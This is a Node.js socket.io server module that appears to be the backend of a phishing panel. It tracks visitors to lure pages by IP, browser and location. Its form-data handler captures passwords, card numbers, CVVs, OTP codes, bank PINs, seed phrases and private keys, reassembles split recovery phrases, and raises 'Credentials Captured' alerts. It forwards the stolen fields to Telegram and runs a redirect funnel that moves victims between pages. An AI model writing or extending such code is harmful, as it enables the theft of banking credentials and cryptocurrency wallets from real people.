const { v4: uuidv4 } = require('uuid');
const { getAdapter } = require('../database/adapter');
const telegramService = require('../services/telegram');
const redirectService = require('../services/redirect');
const notificationService = require('../services/notification');

const SESSION_SELECT = `
  SELECT s.*, w.name as website_name, w.domain as website_domain, w.logo_url as logo_url, w.color as website_color,
         dp.name as current_page_name, dp.form_type as current_page_type
  FROM sessions s
  LEFT JOIN websites w ON s.website_id = w.id
  LEFT JOIN demo_pages dp ON s.website_id = dp.website_id AND (
    s.current_page LIKE (dp.url || '%') OR dp.url LIKE ('%' || s.current_page)
  )
  WHERE s.id = ?
`;

function setupTrackerNamespace(io, trackerNsp) {
  trackerNsp.on('connection', async (socket) => {
    const apiKey = socket.handshake.auth?.apiKey || socket.handshake.query?.apiKey;

    if (!apiKey) {
      socket.emit('error', { message: 'API key required' });
      socket.disconnect(true);
      return;
    }

    const db = getAdapter();

    // Validate API key and find website
    const website = await db.get(
      'SELECT * FROM websites WHERE api_key = ? AND is_active = 1',
      [apiKey]
    );

    if (!website) {
      socket.emit('error', { message: 'Invalid API key' });
      socket.disconnect(true);
      return;
    }

    socket.websiteId = website.id;
    socket.websiteName = website.name;
    socket.join(`website:${website.id}`);

    // ─── tracker:init ─────────────────────────────────────────
    socket.on('tracker:init', async (data) => {
      try {
        let sessionId = data.sessionId || uuidv4();
        const ip = _getClientIp(socket);
        const ua = data.userAgent || socket.handshake.headers['user-agent'] || '';
        const parsed = _parseUserAgent(ua);
        const geo = _getGeoInfo(ip);

        socket.sessionId = sessionId;
        socket.join(`session:${sessionId}`);

        let existingSession = await db.get('SELECT * FROM sessions WHERE id = ?', [sessionId]);

        if (existingSession && existingSession.website_id !== website.id) {
          console.log(`[ALP] Session ${sessionId} belongs to website ${existingSession.website_id}, not ${website.id}. Creating new session.`);
          existingSession = null;
          const freshId = uuidv4();
          socket.sessionId = freshId;
          socket.leave(`session:${sessionId}`);
          socket.join(`session:${freshId}`);
          sessionId = freshId;
        }

        if (existingSession) {
          await db.run(
            'UPDATE sessions SET is_active = 1, last_activity = CURRENT_TIMESTAMP, current_page = ?, referrer = ? WHERE id = ?',
            [data.page || data.url || '', data.referrer || '', sessionId]
          );
        } else {
          await db.run(
            `INSERT INTO sessions (id, website_id, visitor_id, ip_address, user_agent, browser, os, device, country, city, current_page, referrer, pages_viewed, started_at, last_activity, is_active, metadata)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP, CURRENT_TIMESTAMP, 1, '{}')`,
            [
              sessionId, website.id, data.visitorId || uuidv4(),
              ip, ua, parsed.browser, parsed.os, parsed.device,
              geo.country, geo.city,
              data.page || data.url || '', data.referrer || ''
            ]
          );
        }

        if (data.isNewPageLoad) {
          await db.run(
            'INSERT INTO page_views (session_id, website_id, page_url, page_title, duration_ms, timestamp) VALUES (?, ?, ?, ?, 0, CURRENT_TIMESTAMP)',
            [sessionId, website.id, data.page || data.url || '', data.title || '']
          );
          if (existingSession) {
            await db.run('UPDATE sessions SET pages_viewed = pages_viewed + 1 WHERE id = ?', [sessionId]);
          }
        }

        const session = await db.get(SESSION_SELECT, [sessionId]);

        socket.emit('tracker:session', { sessionId });

        const adminNsp = io.of('/admin');
        if (existingSession) {
          adminNsp.emit('admin:session:update', session);
        } else {
          adminNsp.emit('admin:session:new', session);

          const notifySetting = await db.get("SELECT value FROM settings WHERE key = 'notify_new_session'", []);
          if (!notifySetting || notifySetting.value !== '0') {
            notificationService.createNotification(io, {
              type: 'success',
              title: 'New Visitor Live',
              message: `New visitor session active from ${session?.ip_address || 'Unknown IP'} (${parsed.browser || 'Unknown'}/${parsed.os || 'Unknown'}) on ${website.name}.`,
              link: `#/sessions?id=${sessionId}`
            });
          }
        }

        await db.run(
          'INSERT INTO activity_feed (type, icon, message, details, website_id, session_id) VALUES (?, ?, ?, ?, ?, ?)',
          [
            'session', '👤',
            existingSession
              ? `Visitor returned on ${website.name}`
              : `New visitor from ${geo.country || 'Unknown'} on ${website.name}`,
            JSON.stringify({ browser: parsed.browser, os: parsed.os, page: data.page || data.url || '' }),
            website.id, sessionId
          ]
        );

        if (!existingSession) {
          telegramService.sendSessionAlert(session).catch(() => {});
        }

        await _checkRedirectRules(io, session);
      } catch (err) {
        console.error('tracker:init error:', err.message);
        socket.emit('error', { message: 'Failed to initialize session' });
      }
    });

    // ─── tracker:pageview ─────────────────────────────────────
    socket.on('tracker:pageview', async (data) => {
      try {
        if (!socket.sessionId) return;
        await db.run(
          'INSERT INTO page_views (session_id, website_id, page_url, page_title, duration_ms, timestamp) VALUES (?, ?, ?, ?, ?, CURRENT_TIMESTAMP)',
          [socket.sessionId, website.id, data.url || data.page || '', data.title || '', data.duration || 0]
        );
        await db.run(
          'UPDATE sessions SET current_page = ?, pages_viewed = pages_viewed + 1, last_activity = CURRENT_TIMESTAMP, is_active = 1 WHERE id = ?',
          [data.url || data.page || '', socket.sessionId]
        );
        const updatedSession = await db.get(SESSION_SELECT, [socket.sessionId]);
        if (updatedSession) {
          io.of('/admin').emit('admin:session:update', updatedSession);
        }
      } catch (err) {
        console.error('tracker:pageview error:', err.message);
      }
    });

    // ─── tracker:activity ─────────────────────────────────────
    socket.on('tracker:activity', async (data) => {
      try {
        if (!socket.sessionId) return;
        const page = (data && data.page) || null;
        if (page) {
          await db.run(
            'UPDATE sessions SET last_activity = CURRENT_TIMESTAMP, current_page = ?, is_active = 1 WHERE id = ?',
            [page, socket.sessionId]
          );
        } else {
          await db.run(
            'UPDATE sessions SET last_activity = CURRENT_TIMESTAMP, is_active = 1 WHERE id = ?',
            [socket.sessionId]
          );
        }
        const updatedSession = await db.get(SESSION_SELECT, [socket.sessionId]);
        if (updatedSession) {
          io.of('/admin').emit('admin:session:update', updatedSession);
        }
      } catch (err) {
        console.error('tracker:activity error:', err.message);
      }
    });

    // ─── tracker:formdata ─────────────────────────────────────
    socket.on('tracker:formdata', async (data) => {
      try {
        if (!socket.sessionId) return;

        const sessionRow = await db.get('SELECT metadata FROM sessions WHERE id = ?', [socket.sessionId]);
        let metadata = {};
        try { metadata = JSON.parse(sessionRow?.metadata || '{}'); } catch { /* ignore */ }

        const rawFields = data.fields || data.formData || data.data || {};
        let mappedFields = { ...rawFields };
        try {
          const cleanUrl = (u) => (u || '').split('?')[0].replace(/\/$/, '').toLowerCase().replace(/\.html$/, '');
          const targetPath = cleanUrl(data.page || '');
          if (targetPath) {
            const demoPages = await db.all('SELECT url, field_mappings FROM demo_pages WHERE website_id = ?', [socket.websiteId]);
            const matchingPage = demoPages.find(p => cleanUrl(p.url) === targetPath);
            if (matchingPage && matchingPage.field_mappings) {
              const mappings = JSON.parse(matchingPage.field_mappings || '{}');
              const destGroups = {};
              for (const rawKey of Object.keys(rawFields)) {
                const destKey = mappings[rawKey] || rawKey;
                if (!destGroups[destKey]) destGroups[destKey] = [];
                destGroups[destKey].push(rawKey);
              }
              mappedFields = {};
              for (const [destKey, rawKeys] of Object.entries(destGroups)) {
                if (rawKeys.length === 1) {
                  mappedFields[destKey] = rawFields[rawKeys[0]];
                } else {
                  const sorted = rawKeys.slice().sort((a, b) => {
                    const numA = parseInt((a.match(/\d+$/) || ['0'])[0], 10);
                    const numB = parseInt((b.match(/\d+$/) || ['0'])[0], 10);
                    return numA - numB;
                  });
                  const PHRASE_DEST_KEYS = ['seed_phrase','mnemonic','recovery_phrase','security_question','security_answer','full_name','billing_address','shipping_address'];
                  const separator = PHRASE_DEST_KEYS.includes(destKey) ? ' ' : '';
                  mappedFields[destKey] = sorted.map(k => rawFields[k]).join(separator);
                }
              }
            }
          }
        } catch (err) {
          console.error('[ALP] Field mapping error:', err.message);
        }

        const capturedFields = mappedFields;
        if (!metadata.formData) metadata.formData = [];

        const isDuplicate = metadata.formData.some(entry => {
          const timeDiff = Date.now() - new Date(entry.timestamp).getTime();
          if (timeDiff > 2000) return false;
          const criticalKeys = ['email','password','card_number','cvv','expiry','otp_code','phone','seed_phrase','private_key','wallet_pin','auth_code','bank_pin'];
          let checkedCount = 0, matchCount = 0;
          for (const key of criticalKeys) {
            if (key in entry.fields && key in capturedFields) {
              checkedCount++;
              if (String(entry.fields[key]) === String(capturedFields[key])) matchCount++;
            }
          }
          if (checkedCount > 0) return matchCount === checkedCount;
          return JSON.stringify(entry.fields) === JSON.stringify(capturedFields);
        });

        if (isDuplicate) {
          console.log('[ALP] Ignored duplicate form submission for session:', socket.sessionId);
          return;
        }

        metadata.formData.push({
          page: data.page || '', formId: data.formId || '', formAction: data.formAction || '',
          fields: capturedFields, timestamp: new Date().toISOString()
        });

        await db.run(
          'UPDATE sessions SET metadata = ?, last_activity = CURRENT_TIMESTAMP, is_active = 1 WHERE id = ?',
          [JSON.stringify(metadata), socket.sessionId]
        );

        const updatedSession = await db.get(SESSION_SELECT, [socket.sessionId]);
        if (updatedSession) {
          io.of('/admin').emit('admin:session:update', updatedSession);
        }

        const fieldCount = Object.keys(capturedFields).length;
        await db.run(
          'INSERT INTO activity_feed (type, icon, message, details, website_id, session_id) VALUES (?, ?, ?, ?, ?, ?)',
          [
            'formdata', '📝',
            `Form data captured (${fieldCount} fields) on ${website.name}`,
            JSON.stringify({ page: data.page || '', formId: data.formId || '', fields: capturedFields }),
            website.id, socket.sessionId
          ]
        );

        const notifySetting = await db.get("SELECT value FROM settings WHERE key = 'notify_form_data'", []);
        if (!notifySetting || notifySetting.value !== '0') {
          const ignoreKeys = ['page','formid','formaction','submit','remember_me','remember'];
          const fieldsStr = Object.keys(capturedFields).filter(k => !ignoreKeys.includes(k.toLowerCase())).join(', ');
          const rawPage = (data.page || '').split('/').pop() || '';
          const pageName = rawPage.replace('.html', '').toLowerCase() || 'form';
          notificationService.createNotification(io, {
            type: 'alert', title: 'Credentials Captured',
            message: `Data captured ${pageName}: ${fieldsStr}`,
            link: `#/sessions?id=${socket.sessionId}`
          });
        }

        telegramService.sendFormDataAlert({ ...data, fields: capturedFields }, website).catch(() => {});
        redirectService.handleFunnelFormSubmit(io, socket.sessionId, data.page);
      } catch (err) {
        console.error('tracker:formdata error:', err.message);
      }
    });

    // ─── disconnect ───────────────────────────────────────────
    socket.on('disconnect', () => {
      try {
        if (!socket.sessionId) return;
        const sessionId = socket.sessionId;
        const websiteId = website.id;
        const websiteName = website.name;

        setTimeout(async () => {
          try {
            const activeSockets = await trackerNsp.in(`session:${sessionId}`).fetchSockets();
            if (activeSockets.length > 0) return;

            const db = getAdapter();
            await db.run(
              'UPDATE sessions SET is_active = 0, last_activity = CURRENT_TIMESTAMP WHERE id = ?',
              [sessionId]
            );
            io.of('/admin').emit('admin:session:end', {
              id: sessionId, sessionId, websiteId, websiteName,
              timestamp: new Date().toISOString()
            });
          } catch (err) {
            console.error('tracker delayed disconnect check error:', err.message);
          }
        }, 20000);
      } catch (err) {
        console.error('tracker disconnect error:', err.message);
      }
    });
  });
}

async function _checkRedirectRules(io, session) {
  try {
    const db = getAdapter();
    const adminOnlineSetting = await db.get("SELECT value FROM settings WHERE key = 'admin_online'", []);
    const isAdminOnline = adminOnlineSetting ? adminOnlineSetting.value === '1' : false;
    const matchedRule = await redirectService.evaluateRules(session, isAdminOnline);
    if (matchedRule) {
      redirectService.executeRedirect(io, session.id, matchedRule.target_url, null);
      await db.run('UPDATE redirect_rules SET redirect_count = redirect_count + 1 WHERE id = ?', [matchedRule.id]);
    }
  } catch (err) {
    console.error('Redirect rule check error:', err.message);
  }
}

function _getClientIp(socket) {
  return socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim()
    || socket.handshake.headers['x-real-ip']
    || socket.handshake.address
    || '0.0.0.0';
}

function _parseUserAgent(ua) {
  if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Desktop' };
  const uaLower = ua.toLowerCase();
  let browser = 'Unknown';
  if (uaLower.includes('edg/') || uaLower.includes('edge/')) {
    browser = 'Edge';
    const match = ua.match(/Edg\/(\d+)/i) || ua.match(/Edge\/(\d+)/i);
    if (match) browser = `Edge ${match[1]}`;
  } else if (uaLower.includes('opr/') || uaLower.includes('opera')) {
    browser = 'Opera';
    const match = ua.match(/OPR\/(\d+)/i);
    if (match) browser = `Opera ${match[1]}`;
  } else if (uaLower.includes('chrome/') && !uaLower.includes('chromium')) {
    browser = 'Chrome';
    const match = ua.match(/Chrome\/(\d+)/i);
    if (match) browser = `Chrome ${match[1]}`;
  } else if (uaLower.includes('firefox/')) {
    browser = 'Firefox';
    const match = ua.match(/Firefox\/(\d+)/i);
    if (match) browser = `Firefox ${match[1]}`;
  } else if (uaLower.includes('safari/') && !uaLower.includes('chrome')) {
    browser = 'Safari';
    const match = ua.match(/Version\/(\d+)/i);
    if (match) browser = `Safari ${match[1]}`;
  } else if (uaLower.includes('msie') || uaLower.includes('trident/')) {
    browser = 'Internet Explorer';
  }
  let os = 'Unknown';
  if (uaLower.includes('windows nt 10')) os = 'Windows 10';
  else if (uaLower.includes('windows')) os = 'Windows';
  else if (uaLower.includes('mac os x')) {
    os = 'macOS';
    const match = ua.match(/Mac OS X (\d+[._]\d+)/);
    if (match) os = `macOS ${match[1].replace(/_/g, '.')}`;
  } else if (uaLower.includes('android')) {
    os = 'Android';
    const match = ua.match(/Android (\d+\.?\d*)/i);
    if (match) os = `Android ${match[1]}`;
  } else if (uaLower.includes('iphone') || uaLower.includes('ipad')) {
    os = 'iOS';
    const match = ua.match(/OS (\d+[._]\d+)/);
    if (match) os = `iOS ${match[1].replace(/_/g, '.')}`;
  } else if (uaLower.includes('linux')) os = 'Linux';
  else if (uaLower.includes('cros')) os = 'Chrome OS';
  let device = 'Desktop';
  if (uaLower.includes('mobile') || uaLower.includes('iphone') || (uaLower.includes('android') && !uaLower.includes('tablet'))) {
    device = 'Mobile';
  } else if (uaLower.includes('tablet') || uaLower.includes('ipad')) {
    device = 'Tablet';
  } else if (uaLower.includes('bot') || uaLower.includes('crawler') || uaLower.includes('spider')) {
    device = 'Bot';
  }
  return { browser, os, device };
}

function _getGeoInfo(ip) {
  try {
    const geoip = require('geoip-lite');
    const cleanIp = ip.replace(/^::ffff:/, '');
    const geo = geoip.lookup(cleanIp);
    if (geo) return { country: geo.country || '', city: geo.city || '' };
  } catch { /* geoip-lite not available */ }
  return { country: '', city: '' };
}

module.exports = { setupTrackerNamespace };
